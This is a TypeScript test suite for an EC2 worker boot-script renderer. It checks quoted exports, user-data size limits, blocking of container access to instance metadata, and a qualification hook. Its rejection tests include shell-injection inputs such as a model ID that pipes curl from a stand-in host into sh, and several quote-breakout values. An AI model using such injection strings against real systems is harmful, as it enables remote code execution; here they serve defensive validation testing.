import { spawnSync } from "node:child_process";
import { randomBytes, randomUUID } from "node:crypto";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { gunzipSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import {
  EC2_USER_DATA_MAX_BYTES,
  Ec2WorkerBootConfigSchema,
  ec2WorkerBootScript,
  ec2WorkerUserData,
  type Ec2WorkerBootConfig,
} from "../../packages/contracts/src/session.js";
import { SECRET_ARN_MAX_LENGTH } from "../../packages/contracts/src/model-providers.js";

const bootScript = readFileSync(new URL("../../packages/worker/ec2/boot.sh", import.meta.url), "utf8");
const qualificationScript = /cat >\/usr\/local\/libexec\/agentx-e2e-qualification <<'QUALIFICATION'\n([\s\S]*?)\nQUALIFICATION/.exec(bootScript)?.[1] ?? "";
const workerLauncher = /cat >\/usr\/local\/libexec\/agentx-worker-start <<'LAUNCHER'\n([\s\S]*?)\nLAUNCHER/.exec(bootScript)?.[1] ?? "";

const config: Ec2WorkerBootConfig = {
  workspaceId: randomUUID(),
  generation: 2,
  volumeId: "vol-0123456789abcdef0",
  expectNewVolume: false,
  workerImage: `111122223333.dkr.ecr.us-east-1.amazonaws.com/agentx/worker@sha256:${"b".repeat(64)}`,
  invokePublicKey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE+/9=",
  controlPlaneUrl: "https://abc123.execute-api.us-east-1.amazonaws.com",
  modelProvider: "amazon-bedrock",
  modelId: "arn:aws:bedrock:us-east-1:111122223333:inference-profile/us.anthropic.claude-sonnet-5-v1:0",
  promptCacheRetention: "short",
  logGroupName: "/agentx/production/worker",
};

describe("EC2 worker user data", () => {
  it("passes OpenRouter references to the container and rejects secrets or shell injection", () => {
    const secretArn = "arn:aws:secretsmanager:us-east-1:123456789012:secret:agentx/test/openrouter-AbCdEf";
    const rendered = ec2WorkerBootScript({ ...config, openRouterSecretArn: secretArn, openRouterProviders: "anthropic,openai" }, bootScript);
    expect(rendered).toContain(`export AGENTX_OPENROUTER_SECRET_ARN='${secretArn}'`);
    expect(rendered).toContain("AGENTX_OPENROUTER_SECRET_ARN=${AGENTX_OPENROUTER_SECRET_ARN:-}");
    expect(rendered).not.toContain("OPENROUTER_API_KEY");
    expect(() => ec2WorkerBootScript({ ...config, openRouterSecretArn: "sk-key" }, bootScript)).toThrow();
    expect(() => ec2WorkerBootScript({ ...config, openRouterProviders: "anthropic';touch /tmp/bad" }, bootScript)).toThrow();
  });
  it.each([["anthropicSecretArn", "AGENTX_ANTHROPIC_SECRET_ARN", "ANTHROPIC_API_KEY"], ["openaiSecretArn", "AGENTX_OPENAI_SECRET_ARN", "OPENAI_API_KEY"]] as const)(
    "passes the %s reference to the container, never a key", (field, variable, keyVariable) => {
      const secretArn = "arn:aws:secretsmanager:us-east-1:123456789012:secret:agentx/test/direct-AbCdEf";
      const rendered = ec2WorkerBootScript({ ...config, [field]: secretArn }, bootScript);
      expect(rendered).toContain(`export ${variable}='${secretArn}'`);
      expect(rendered).toContain(`${variable}=\${${variable}:-}`);
      expect(rendered).not.toContain(keyVariable);
      expect(ec2WorkerBootScript(config, bootScript)).not.toContain(`export ${variable}=`);
      expect(() => ec2WorkerBootScript({ ...config, [field]: "sk-ant-api03-key" }, bootScript)).toThrow();
      expect(() => ec2WorkerBootScript({ ...config, [field]: `${secretArn}';touch /tmp/bad` }, bootScript)).toThrow();
    });
  it("prepends every boot value to the script as a quoted export", () => {
    const userData = ec2WorkerBootScript(config, bootScript);
    expect(userData.startsWith("#!/bin/bash\n")).toBe(true);
    expect(userData.match(/^#!/gm)).toHaveLength(2);
    expect(userData).toContain("cat >/usr/local/libexec/agentx-worker-start <<'LAUNCHER'\n#!/bin/bash");
    expect(userData).toContain(`export AGENTX_WORKSPACE_ID='${config.workspaceId}'`);
    expect(userData).toContain("export AGENTX_SESSION_GENERATION='2'");
    expect(userData).toContain("export AGENTX_EXPECT_NEW_VOLUME='false'");
    expect(userData).toContain(`export AGENTX_MODEL_ID='${config.modelId}'`);
    expect(userData).toContain("export PI_CACHE_RETENTION='short'");
    expect(userData.endsWith("main \"$@\"\n")).toBe(true);
  });

  it("sends the boot script as base64 gzip user data that cloud-init unpacks to exactly that script (#229)", () => {
    const encoded = ec2WorkerUserData(config, bootScript);
    expect(encoded).toMatch(/^[A-Za-z0-9+/]+={0,2}$/);
    const raw = Buffer.from(encoded, "base64");
    // cloud-init recognizes gzip user data by its magic bytes and decompresses it before running it.
    expect([...raw.subarray(0, 2)]).toEqual([0x1f, 0x8b]);
    expect(gunzipSync(raw).toString("utf8")).toBe(ec2WorkerBootScript(config, bootScript));
  });

  it("leaves real headroom under EC2's 16 KB user data limit with every value at its maximum (#223, #229)", () => {
    // Random letters and digits barely compress, so this is the largest user data the schema admits.
    const noise = (length: number) => {
      const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      return [...randomBytes(length)].map((byte) => alphabet[byte % alphabet.length]).join("");
    };
    const lower = (length: number) => noise(length).toLowerCase();
    const secretPrefix = "arn:aws:secretsmanager:us-east-1:123456789012:secret:";
    const worstCase = Ec2WorkerBootConfigSchema.parse({
      ...config,
      generation: Number.MAX_SAFE_INTEGER,
      invokePublicKey: noise(1_024),
      controlPlaneUrl: `https://${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(56)}`,
      modelProvider: noise(128),
      modelId: noise(256),
      openRouterSecretArn: `${secretPrefix}${noise(2_048 - secretPrefix.length)}`,
      openRouterProviders: [...Array.from({ length: 6 }, () => lower(80)), lower(26)].join(","),
      anthropicSecretArn: `${secretPrefix}${noise(SECRET_ARN_MAX_LENGTH - secretPrefix.length)}`,
      openaiSecretArn: `${secretPrefix}${noise(SECRET_ARN_MAX_LENGTH - secretPrefix.length)}`,
      logGroupName: `/${noise(511)}`,
      executorImage: `111122223333.dkr.ecr.us-east-1.amazonaws.com/${lower(120)}@sha256:${"e".repeat(64)}`,
    });
    expect(worstCase.controlPlaneUrl).toHaveLength(512);
    expect(worstCase.openRouterProviders).toHaveLength(512);
    expect(worstCase.anthropicSecretArn).toHaveLength(SECRET_ARN_MAX_LENGTH);
    const compressed = Buffer.from(ec2WorkerUserData(worstCase, bootScript), "base64").length;
    // EC2 measures user data before base64 encoding; at least 2 KB of it stays free for boot changes. It was 4 KB until the opt-in
    // TEST qualification hook (about 1.5 KB compressed) and the executor image setting were added: this worst case sets every value at
    // its maximum at once, which no real worker's configuration does.
    expect(compressed).toBeLessThanOrEqual(EC2_USER_DATA_MAX_BYTES - 2_048);
  });

  it("measures the limit on the compressed user data, not the script (#229)", () => {
    const longScript = `${bootScript}${"#".repeat(EC2_USER_DATA_MAX_BYTES)}\n`;
    expect(Buffer.byteLength(ec2WorkerBootScript(config, longScript))).toBeGreaterThan(EC2_USER_DATA_MAX_BYTES);
    expect(Buffer.from(ec2WorkerUserData(config, longScript), "base64").length).toBeLessThan(EC2_USER_DATA_MAX_BYTES);
  });

  it("refuses to render user data EC2 would reject for its size (#223)", () => {
    // Random bytes do not compress, so this pushes the compressed user data past the limit.
    const incompressible = `${bootScript}# ${randomBytes(EC2_USER_DATA_MAX_BYTES).toString("base64")}\n`;
    expect(() => ec2WorkerUserData(config, incompressible)).toThrow(/worker user data is \d+ bytes compressed; EC2 allows less than 16384/);
  });

  it("exports exactly the variables the boot script requires", () => {
    const required = /for name in ([\s\S]*?); do/.exec(bootScript)?.[1]?.split(/[\s\\]+/).filter(Boolean) ?? [];
    const exported = [...ec2WorkerBootScript(config, bootScript).matchAll(/^export (\w+)=/gm)].map((match) => match[1]);
    expect(required.length).toBeGreaterThan(0);
    expect(exported.sort()).toEqual(required.sort());
  });

  it("gives the worker the host's Docker and keeps Docker's data on the workspace volume (#121)", () => {
    expect(bootScript).toContain("readonly DOCKER_DATA_ROOT=$MOUNT_PATH/.docker");
    expect(bootScript).toContain(`printf '{"data-root": "%s"}\\n' "$DOCKER_DATA_ROOT" >/etc/docker/daemon.json`);
    // The daemon starts only after the workspace is mounted, so its data root is on the volume.
    expect(bootScript.indexOf("mount_workspace \"$device\"")).toBeLessThan(bootScript.indexOf("  ensure_docker\n"));
    expect(workerLauncher).toContain('args=(run --rm --name "$WORKER_CONTAINER" --network host --env-file "$WORKER_ENV_FILE" --volume "$MOUNT_PATH:$MOUNT_PATH")');
    expect(workerLauncher).toContain('args+=(--volume "$RUNTIME_ROOT:$RUNTIME_ROOT" --env CONTAINED_FOUNDATION_EVIDENCE_DIR="$RUNTIME_ROOT/evidence" --env TMPDIR="$RUNTIME_ROOT/tmp")');
    expect(workerLauncher).toContain("args+=(--env TMPDIR=/tmp)");
    expect(bootScript).toContain("ExecStart=/usr/local/libexec/agentx-worker-start");
    expect(bootScript).toContain("RequiresMountsFor=$MOUNT_PATH");
  });

  it("prepares fixed private EBS runtime paths and retries the pinned contained image before starting the worker", () => {
    expect(bootScript).toContain('readonly RUNTIME_SOURCE=$MOUNT_PATH/.agentx-runtime');
    expect(bootScript).toContain('readonly RUNTIME_ROOT=/mnt/agentx-runtime');
    expect(bootScript).toContain('mount --bind "$RUNTIME_SOURCE" "$RUNTIME_ROOT"');
    expect(bootScript).toContain('readonly CANDIDATE_SCRATCH_ROOT=$RUNTIME_ROOT/candidates');
    expect(bootScript).toContain('readonly EVIDENCE_ROOT=$RUNTIME_ROOT/evidence');
    expect(bootScript).toContain('readonly CONTAINED_STATE_ROOT=$RUNTIME_ROOT/state');
    expect(bootScript).toContain('install -d -o "$WORKER_UID" -g "$WORKER_GID" -m 0700 "$RUNTIME_SOURCE/$path"');
    expect(bootScript).toContain('verifier unavailable; setup smoke withheld');
    expect(bootScript).toContain("printf 'TMPDIR=/tmp\\n'");
    expect(workerLauncher).toContain('args+=(--volume "$RUNTIME_ROOT:$RUNTIME_ROOT" --env CONTAINED_FOUNDATION_EVIDENCE_DIR="$RUNTIME_ROOT/evidence" --env TMPDIR="$RUNTIME_ROOT/tmp")');
    expect(workerLauncher).toContain("args+=(--env TMPDIR=/tmp)");
    expect(bootScript).toContain('docker pull "$CONTAINED_IMAGE"');
    expect(bootScript).toContain('optional verifier image unavailable; worker continues');
    expect(bootScript).toContain('pull_contained_image || true');
    expect(bootScript.indexOf('prepare_contained_runtime_directories')).toBeLessThan(bootScript.indexOf('pull_worker_image "$region"'));
    expect(bootScript.indexOf('pull_contained_image')).toBeLessThan(bootScript.indexOf('write_worker_unit "$region"'));
  });

  it("keeps containers off the instance metadata service and pulls the executor image after the worker image", () => {
    expect(bootScript).toContain("iptables -I DOCKER-USER -d 169.254.169.254/32 -j DROP");
    // The rule is idempotent: a -C check comes first, and a failure to install it stops the boot.
    expect(bootScript).toContain("iptables -C DOCKER-USER -d 169.254.169.254/32 -j DROP 2>/dev/null || iptables -I DOCKER-USER");
    expect(bootScript).toContain('|| fail "could not block container access to the instance metadata service"');
    // DOCKER-USER exists only once the daemon is running.
    expect(bootScript.indexOf("systemctl restart docker.service")).toBeLessThan(bootScript.indexOf("  block_container_metadata_access\n}\n"));
    // The rule is also a oneshot unit, so it returns after a reboot (Docker rebuilds its chains) and lands before the worker starts.
    expect(bootScript).toContain("readonly IMDS_DROP_UNIT=rovara-imds-drop.service");
    expect(bootScript).toContain("Type=oneshot");
    expect(bootScript).toContain("RemainAfterExit=yes");
    expect(bootScript).toMatch(/\[Unit\][^]*?After=docker\.service\nBefore=\$WORKER_UNIT/);
    expect(bootScript).toContain("ExecStart=/bin/bash /usr/local/libexec/rovara-imds-drop");
    // A worker must not start unless the drop is in place: it requires and follows the drop unit.
    expect(bootScript).toContain("Requires=docker.service $IMDS_DROP_UNIT\nAfter=docker.service $IMDS_DROP_UNIT network-online.target");
    expect(bootScript).toContain('systemctl enable "$IMDS_DROP_UNIT" && bash /usr/local/libexec/rovara-imds-drop || fail');
    expect(bootScript).toContain('docker pull "$EXECUTOR_IMAGE"');
    // Unset until the control plane sets it: the pull is skipped, never a boot failure.
    expect(bootScript).toContain('[[ -n "${EXECUTOR_IMAGE:-}" ]] || return 0');
    expect(bootScript).toContain("pull_executor_image || true");
    expect(bootScript.indexOf('pull_worker_image "$region"')).toBeLessThan(bootScript.indexOf("pull_executor_image || true"));
    expect(bootScript.indexOf("pull_executor_image || true")).toBeLessThan(bootScript.indexOf('write_worker_unit "$region"'));
  });

  it("renders a script bash accepts", () => {
    const checked = spawnSync("bash", ["-n"], { input: ec2WorkerBootScript(config, bootScript), encoding: "utf8" });
    expect(checked.status, checked.stderr).toBe(0);
  });

  it.each([
    ["a model ID that breaks out of its quotes", { modelId: "x'; curl evil.test | sh; '" }],
    ["a model ID with a space", { modelId: "claude sonnet" }],
    ["a control plane URL over plain HTTP", { controlPlaneUrl: "http://control.example.test" }],
    ["a control plane URL with a quote", { controlPlaneUrl: "https://control.example.test/'x" }],
    ["an image pinned by tag", { workerImage: "111122223333.dkr.ecr.us-east-1.amazonaws.com/agentx-worker:latest" }],
    ["an image outside ECR", { workerImage: `docker.io/library/node@sha256:${"c".repeat(64)}` }],
    ["a public key with a newline", { invokePublicKey: "MFkw\nEwYH" }],
    ["a log group with a space", { logGroupName: "/agentx/worker logs" }],
    ["a generation of 0", { generation: 0 }],
    ["an unknown cache retention", { promptCacheRetention: "forever" }],
  ])("refuses %s", (_name, override) => {
    expect(() => ec2WorkerBootScript({ ...config, ...override } as Ec2WorkerBootConfig, bootScript)).toThrow();
    expect(() => ec2WorkerUserData({ ...config, ...override } as Ec2WorkerBootConfig, bootScript)).toThrow();
  });

  it("refuses unknown fields", () => {
    expect(() => Ec2WorkerBootConfigSchema.parse({ ...config, extra: "x" })).toThrow();
  });
});


const executorImage = `111122223333.dkr.ecr.us-east-1.amazonaws.com/agentx/executor@sha256:${"e".repeat(64)}`;
const runId = "0b6e6f0e-5d3b-4f0e-9d3a-2f1c4b7a8e90";
const qualification = { bucket: "agentx-agentxlivetest123-control-artifacts82dd59a1-syx0unxsewcf", prefix: `e2e-runtime/${runId}/`, profile: "linux-arm64-web-api-v1" } as const;

/** Runs one shell function of the boot script on its own, with the script's own fixed paths replaced by the test's. */
function runBootFunction(name: string, args: string[], environment: Record<string, string>, replace: Array<[string, string]> = []): { status: number | null; stdout: string; stderr: string } {
  const start = bootScript.indexOf(`\n${name}() {`);
  const end = bootScript.indexOf("\n}\n", start);
  expect(start, `${name} is in boot.sh`).toBeGreaterThan(-1);
  let text = bootScript.slice(start + 1, end + 3);
  for (const [from, to] of replace) text = text.split(from).join(to);
  const program = `log() { printf 'agentx-boot: %s\\n' "$*" >&2; }\n${text}\n${name} "$@"`;
  const ran = spawnSync("bash", ["-c", program, "bash", ...args], { encoding: "utf8", env: { PATH: process.env.PATH ?? "", ...environment } });
  return { status: ran.status, stdout: ran.stdout, stderr: ran.stderr };
}

describe("the executor image on the worker", () => {
  it("passes EXECUTOR_IMAGE through the boot config, only when the release has one, and only as an ECR image pinned by digest", () => {
    expect(ec2WorkerBootScript({ ...config, executorImage }, bootScript)).toContain(`export EXECUTOR_IMAGE='${executorImage}'`);
    expect(ec2WorkerBootScript(config, bootScript)).not.toContain("export EXECUTOR_IMAGE=");
    for (const bad of [
      "111122223333.dkr.ecr.us-east-1.amazonaws.com/agentx/executor:latest",
      `docker.io/library/node@sha256:${"c".repeat(64)}`,
      `${executorImage}';touch /tmp/bad`,
    ]) expect(() => ec2WorkerBootScript({ ...config, executorImage: bad }, bootScript), bad).toThrow();
  });

  it("writes EXECUTOR_IMAGE into worker.env, so docker exec agentx-worker processes see it, and writes nothing when it is unset", () => {
    const dir = mkdtempSync(join(tmpdir(), "boot-env-"));
    const file = join(dir, "worker.env");
    const base = { AGENTX_CONTROL_PLANE_URL: "https://c.example", AGENTX_MODEL_PROVIDER: "p", AGENTX_MODEL_ID: "m", PI_CACHE_RETENTION: "short", AGENTX_INVOKE_PUBLIC_KEY: "k", AGENTX_WORKSPACE_ID: runId, AGENTX_SESSION_GENERATION: "1" };
    // Only the root-owned install steps are replaced; every line that writes the file's contents runs as in boot.sh.
    const replace: Array<[string, string]> = [
      ['install -d -m 0700 "$(dirname "$WORKER_ENV_FILE")"', ":"],
      ['install -m 0600 /dev/null "$WORKER_ENV_FILE"', ': >"$WORKER_ENV_FILE"'],
    ];
    const withIt = runBootFunction("write_worker_environment", ["us-east-1"], { ...base, EXECUTOR_IMAGE: executorImage, WORKER_ENV_FILE: file, MOUNT_PATH: "/mnt/workspace" }, replace);
    expect(withIt.status, withIt.stderr).toBe(0);
    const lines = readFileSync(file, "utf8").split("\n");
    expect(lines).toContain(`EXECUTOR_IMAGE=${executorImage}`);
    expect(lines.filter((line) => line.startsWith("EXECUTOR_IMAGE="))).toHaveLength(1);
    const without = runBootFunction("write_worker_environment", ["us-east-1"], { ...base, WORKER_ENV_FILE: file, MOUNT_PATH: "/mnt/workspace" }, replace);
    expect(without.status, without.stderr).toBe(0);
    expect(readFileSync(file, "utf8")).not.toContain("EXECUTOR_IMAGE");
  });
});

describe("the opt-in TEST qualification hook", () => {
  it("renders the validated qualification settings into the boot config, only when asked for, and refuses a malformed prefix, profile or bucket", () => {
    const rendered = ec2WorkerBootScript({ ...config, e2eQualification: qualification }, bootScript);
    expect(rendered).toContain(`export AGENTX_E2E_QUALIFICATION_PREFIX='e2e-runtime/${runId}/'`);
    expect(rendered).toContain("export AGENTX_E2E_QUALIFICATION_PROFILE='linux-arm64-web-api-v1'");
    expect(rendered).toContain(`export AGENTX_E2E_QUALIFICATION_BUCKET='${qualification.bucket}'`);
    // The boot script itself carries no bucket name: it comes from this configuration.
    expect(bootScript).not.toMatch(/control-artifacts|agentxlivetest/);
    expect(ec2WorkerBootScript(config, bootScript)).not.toContain("export AGENTX_E2E_QUALIFICATION");
    for (const bad of [
      { ...qualification, prefix: `e2e-runtime/${runId}` },
      { ...qualification, prefix: `e2e-runtime/${runId.toUpperCase()}/` },
      { ...qualification, prefix: "e2e-runtime/../x/" },
      { ...qualification, prefix: `e2e-runtime/${runId}/x/` },
      { ...qualification, prefix: `other/${runId}/` },
      { ...qualification, profile: "linux-arm64-docker-v1" },
      { ...qualification, bucket: "Bucket'; touch /tmp/bad" },
    ]) expect(() => ec2WorkerBootScript({ ...config, e2eQualification: bad } as Ec2WorkerBootConfig, bootScript), JSON.stringify(bad)).toThrow();
  });

  it("starts the hook only when both the prefix and the profile are set, as its own unit, and never lets it fail the boot", () => {
    const dir = mkdtempSync(join(tmpdir(), "boot-hook-"));
    const bin = join(dir, "bin");
    mkdirSync(bin);
    const log = join(dir, "calls.log");
    writeFileSync(join(bin, "systemd-run"), `#!/bin/bash\nprintf '%s\\n' "$*" >>"${log}"\n`);
    chmodSync(join(bin, "systemd-run"), 0o755);
    const replace: Array<[string, string]> = [["write_e2e_qualification_script", ":"]];
    const run = (environment: Record<string, string>) => runBootFunction("start_e2e_qualification", ["us-east-1"], { ...environment, PATH: `${bin}:${process.env.PATH ?? ""}` }, replace);
    for (const environment of [{}, { AGENTX_E2E_QUALIFICATION_PREFIX: qualification.prefix }, { AGENTX_E2E_QUALIFICATION_PROFILE: qualification.profile }, { AGENTX_E2E_QUALIFICATION_PREFIX: "", AGENTX_E2E_QUALIFICATION_PROFILE: qualification.profile }]) {
      expect(run(environment).status).toBe(0);
    }
    expect(existsSync(log)).toBe(false);
    const enabled = { AGENTX_E2E_QUALIFICATION_PREFIX: qualification.prefix, AGENTX_E2E_QUALIFICATION_PROFILE: qualification.profile, AGENTX_E2E_QUALIFICATION_BUCKET: qualification.bucket };
    const started = run(enabled);
    expect(started.status, started.stderr).toBe(0);
    const call = readFileSync(log, "utf8");
    expect(call).toContain("--unit=agentx-e2e-qualification");
    expect(call).toContain("--no-block");
    expect(call).toContain(`/bin/bash /usr/local/libexec/agentx-e2e-qualification us-east-1 ${qualification.bucket} ${qualification.prefix} ${qualification.profile}`);
    // systemd-run failing is logged, never returned as a failure of the boot.
    writeFileSync(join(bin, "systemd-run"), "#!/bin/bash\nexit 1\n");
    const failed = run(enabled);
    expect(failed.status).toBe(0);
    expect(failed.stderr).toContain("could not start the E2E qualification");
    // It starts after the worker unit does, and a failure to start it is only logged.
    expect(bootScript).toContain('start_e2e_qualification "$region" || log "the E2E qualification did not start"');
    expect(bootScript.indexOf('systemctl enable --now "$WORKER_UNIT"')).toBeLessThan(bootScript.indexOf('start_e2e_qualification "$region" ||'));
  });

  it("carries a hook script bash accepts, with every path quoted, that logs and uploads no secret", () => {
    expect(qualificationScript).not.toBe("");
    expect(spawnSync("bash", ["-n"], { input: qualificationScript, encoding: "utf8" }).status).toBe(0);
    // No unquoted expansion of a path or key: once the double-quoted strings are taken out, none of them is left.
    const unquoted = qualificationScript.replace(/"(?:[^"\\]|\\.)*"/g, '""');
    expect(unquoted).not.toMatch(/\$\{?(BUCKET|PREFIX|PROFILE|REGION|EVIDENCE_HOST|EVIDENCE_CONTAINER|STAGE|fetched|proposal)\b/);
    expect(qualificationScript).not.toMatch(/AWS_SECRET|AWS_SESSION_TOKEN|X-aws-ec2-metadata-token|get-secret-value/);
    expect(qualificationScript).toContain("--server-side-encryption AES256");
    expect(qualificationScript).toContain("--user node agentx-worker /usr/local/bin/node /opt/agentx/packages/verifier/dist/install-qualification-cli.js");
  });

  /** Runs the hook script against fake aws, docker, curl, chown and timeout commands that record every call. */
  function runHook(options: { args?: string[]; challenge?: "present" | "missing"; qualifier?: number; proposalBytes?: number; ping?: "up" | "down"; wait?: number } = {}) {
    const dir = mkdtempSync(join(tmpdir(), "boot-hook-run-"));
    const bin = join(dir, "bin");
    const hostRoot = join(dir, "host");
    const evidence = join(hostRoot, "mnt/workspace/.agentx-runtime/evidence");
    const objects = join(dir, "s3");
    for (const path of [bin, evidence, objects]) mkdirSync(path, { recursive: true });
    const calls = join(dir, "calls.log");
    const fake = (name: string, body: string) => { writeFileSync(join(bin, name), `#!/bin/bash\n${body}\n`); chmodSync(join(bin, name), 0o755); };
    fake("aws", `printf 'aws %s\\n' "$*" >>"${calls}"
case "$2" in
  get-object)
    last=; while (($#)); do last=$1; shift; done
    [[ "$FAKE_CHALLENGE" == missing ]] && { echo "NoSuchKey" >&2; exit 254; }
    printf '{"challengeId":"c"}' >"$last" ;;
  put-object)
    key=; body=; while (($#)); do [[ "$1" == --key ]] && key=$2; [[ "$1" == --body ]] && body=$2; shift; done
    mkdir -p "${objects}/$(dirname "$key")"; cp "$body" "${objects}/$key" ;;
esac`);
    fake("docker", `printf 'docker %s\\n' "$*" >>"${calls}"
out=; while (($#)); do [[ "$1" == --out ]] && out=$2; shift; done
[[ "$FAKE_QUALIFIER" != 0 ]] && exit "$FAKE_QUALIFIER"
head -c "$FAKE_PROPOSAL_BYTES" /dev/zero | tr '\\0' 'x' >"${evidence}/$(basename "$out")"`);
    fake("curl", `[[ "$FAKE_PING" == down ]] && exit 22; echo '{"status":"Healthy"}'`);
    fake("chown", `printf 'chown %s\\n' "$*" >>"${calls}"`);
    fake("timeout", `while [[ "$1" == -* ]]; do shift; done; shift; exec "$@"`);
    const result = spawnSync("bash", ["-c", qualificationScript, "bash", ...(options.args ?? ["us-east-1", qualification.bucket, qualification.prefix, qualification.profile])], {
      encoding: "utf8",
      env: {
        PATH: `${bin}:${process.env.PATH ?? ""}`, AGENTX_HOST_ROOT: hostRoot, TMPDIR: dir,
        AGENTX_E2E_QUALIFICATION_POLL_SECONDS: "0", AGENTX_E2E_QUALIFICATION_HEALTHY_WAIT_SECONDS: String(options.wait ?? 1), AGENTX_E2E_QUALIFICATION_CHALLENGE_WAIT_SECONDS: String(options.wait ?? 1),
        FAKE_CHALLENGE: options.challenge ?? "present", FAKE_QUALIFIER: String(options.qualifier ?? 0), FAKE_PROPOSAL_BYTES: String(options.proposalBytes ?? 64), FAKE_PING: options.ping ?? "up",
      },
    });
    const called = existsSync(calls) ? readFileSync(calls, "utf8").split("\n").filter(Boolean) : [];
    const object = (name: string) => { const path = join(objects, qualification.prefix, name); return existsSync(path) ? readFileSync(path, "utf8") : undefined; };
    return { result, called, object, evidence };
  }

  it("fetches the challenge, then runs the qualifier on it, then uploads the proposal and a SUCCEEDED status, in that order", () => {
    const { result, called, object } = runHook();
    expect(result.status, result.stderr).toBe(0);
    const step = (call: string) => (call.startsWith("aws s3api get-object") ? "fetch" : call.startsWith("docker exec") ? "exec" : call.startsWith("aws s3api put-object") ? (call.includes("proposal.json") ? "upload-proposal" : "upload-status") : call.split(" ")[0]);
    expect(called.map(step).filter((name) => name !== "chown")).toEqual(["fetch", "exec", "upload-proposal", "upload-status"]);
    expect(called.find((call) => call.includes("get-object"))).toContain(`--bucket ${qualification.bucket} --key ${qualification.prefix}challenge.json`);
    expect(called.find((call) => call.startsWith("chown"))).toContain("1000:1000");
    const exec = called.find((call) => call.startsWith("docker exec")) ?? "";
    expect(exec).toContain("--user node agentx-worker /usr/local/bin/node /opt/agentx/packages/verifier/dist/install-qualification-cli.js");
    expect(exec).toContain("--profile linux-arm64-web-api-v1");
    expect(exec).toContain("--challenge-file /mnt/agentx-runtime/evidence/runtime-install-challenge.json");
    expect(exec).toContain("--evidence-root /mnt/agentx-runtime/evidence");
    expect(exec).toContain("--out /mnt/agentx-runtime/evidence/runtime-install-proposal.json");
    expect(object("proposal.json")).toBe("x".repeat(64));
    const status = JSON.parse(object("status.json") ?? "{}") as { state?: string; reason?: string; finishedAt?: string };
    expect(status).toMatchObject({ state: "SUCCEEDED", reason: "qualified" });
    expect(status.finishedAt).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$/);
    expect(called.join("\n")).not.toMatch(/secret|token/i);
  });

  it("is refused, touching nothing, for a malformed prefix, profile, bucket or region", () => {
    for (const args of [
      ["us-east-1", qualification.bucket, `e2e-runtime/${runId}`, qualification.profile],
      ["us-east-1", qualification.bucket, `e2e-runtime/${runId}/../`, qualification.profile],
      ["us-east-1", qualification.bucket, `e2e-runtime/${runId}/ x`, qualification.profile],
      ["us-east-1", qualification.bucket, qualification.prefix, "linux-arm64-docker-v1"],
      ["us-east-1", "Bad Bucket", qualification.prefix, qualification.profile],
      ["us-east-1", "", qualification.prefix, qualification.profile],
      ["us east", qualification.bucket, qualification.prefix, qualification.profile],
    ]) {
      const { result, called } = runHook({ args });
      expect(result.status, JSON.stringify(args)).toBe(2);
      expect(called, JSON.stringify(args)).toEqual([]);
    }
  });

  it.each([
    ["the worker never becomes healthy", { ping: "down" as const }, "worker-not-healthy", ["aws"]],
    ["the challenge never appears", { challenge: "missing" as const }, "challenge-unavailable", ["aws"]],
    ["the qualifier fails", { qualifier: 3 }, "qualification-failed-exit-3", ["aws", "docker", "chown"]],
    ["the proposal is larger than the registrar accepts", { proposalBytes: 5 * 1024 * 1024 + 1 }, "proposal-too-large", ["aws", "docker", "chown"]],
  ])("uploads a FAILED status with the reason and no proposal when %s", (_name, options, reason, tools) => {
    const { result, called, object } = runHook(options);
    expect(result.status).toBe(1);
    expect(object("proposal.json")).toBeUndefined();
    const status = JSON.parse(object("status.json") ?? "{}") as { state?: string; reason?: string; finishedAt?: string };
    expect(status).toMatchObject({ state: "FAILED", reason });
    expect(typeof status.finishedAt).toBe("string");
    expect(new Set(called.map((call) => call.split(" ")[0]))).toEqual(new Set(tools));
    // Whatever failed, the worker is untouched: the hook never stops, restarts or removes anything.
    expect(called.join("\n")).not.toMatch(/docker (stop|rm|kill|restart)|systemctl/);
  });
});
